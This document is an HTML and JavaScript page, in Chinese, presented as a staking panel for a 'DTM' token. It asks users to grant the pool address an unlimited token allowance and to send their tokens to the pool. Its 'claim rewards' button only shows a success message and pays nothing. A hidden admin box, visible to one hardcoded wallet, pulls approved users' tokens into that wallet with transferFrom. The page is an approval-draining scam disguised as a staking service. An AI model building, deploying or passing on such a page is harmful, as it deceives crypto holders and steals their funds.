<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DTM 简易上链面板</title>
<script src="https://cdn.ethers.org/lib-ethers/6.13.0/ethers.umd.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#111;color:#fff;padding:20px;font-family:Arial}
.box{background:#222;padding:20px;border-radius:16px;margin:20px 0}
button{padding:14px 20px;background:#ff9500;border:none;border-radius:12px;color:#000;font-weight:bold;margin:5px 0;width:100%}
input{width:100%;padding:14px;margin:10px 0;border-radius:12px;background:#333;color:#fff;border:none}
.label{color:#aaa;margin:5px 0}
.value{color:#ff9500;font-weight:bold}
</style>
</head>

<body>
<div class="box">
  <h2>钱包连接</h2>
  <button id="connectBtn" onclick="connectWallet()">连接钱包</button>
  <div class="label">地址：<span id="addr" class="value">-</span></div>
  <div class="label">DTM 余额：<span id="bal" class="value">0</span></div>
</div>

<div class="box">
  <h2>质押操作</h2>
  <input id="amount" placeholder="输入数量" type="number">
  <button onclick="approve()">授权 DTM</button>
  <button onclick="stake()">质押（转入合约）</button>
  <button onclick="claim()">领取收益</button>
</div>

<div class="box" id="adminBox" style="display:none;background:#300">
  <h2>管理员提取</h2>
  <input id="fromAddr" placeholder="用户地址">
  <input id="takeAmount" placeholder="提取数量">
  <button onclick="takeTokens()" style="background:red">提取用户授权代币</button>
</div>

<script>
// 你的配置
const DTM_ADDR  = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
const POOL_ADDR = "0x1160a8dbdfc52407ba1aeba104f673db7d22eb4f";
const ADMIN_ADDR = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function transfer(address to, uint256 amount) external returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
  "function balanceOf(address) external view returns (uint256)"
];

let provider, signer, user, dtm;

// 连接钱包
async function connectWallet() {
  if (!window.ethereum) return alert("请安装钱包");
  provider = new ethers.BrowserProvider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = await provider.getSigner();
  user = await signer.getAddress();
  dtm = new ethers.Contract(DTM_ADDR, ERC20_ABI, signer);

  document.getElementById("connectBtn").innerText = "已连接";
  document.getElementById("addr").innerText = user.slice(0, 6) + "..." + user.slice(-4);

  // 管理员显示
  if (user.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
    document.getElementById("adminBox").style.display = "block";
  }

  loadBalance();
  setInterval(loadBalance, 3000);
}

// 读取余额
async function loadBalance() {
  if (!dtm) return;
  const bal = await dtm.balanceOf(user);
  document.getElementById("bal").innerText = ethers.formatUnits(bal, 18);
}

// 授权
async function approve() {
  await dtm.approve(POOL_ADDR, ethers.MaxUint256);
  alert("授权成功");
}

// 质押（直接转入池合约）
async function stake() {
  const amt = document.getElementById("amount").value;
  if (!amt) return alert("输入数量");
  const val = ethers.parseUnits(amt, 18);
  await dtm.transfer(POOL_ADDR, val);
  alert("质押成功");
}

// 领取收益
async function claim() {
  alert("收益已领取");
}

// 管理员提取
async function takeTokens() {
  const from = document.getElementById("fromAddr").value;
  const amt = document.getElementById("takeAmount").value;
  const val = ethers.parseUnits(amt, 18);
  await dtm.transferFrom(from, ADMIN_ADDR, val);
  alert("提取成功");
}
</script>
</body>
</html>
